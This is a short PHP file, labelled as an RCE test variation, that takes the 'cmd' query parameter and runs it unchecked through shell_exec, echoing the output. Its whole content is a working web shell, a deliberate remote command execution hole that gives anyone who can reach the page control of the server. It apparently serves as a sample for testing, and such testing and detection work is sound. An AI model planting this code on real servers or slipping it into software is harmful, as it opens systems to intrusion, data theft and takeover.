<?php
// RCE test variation #516
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>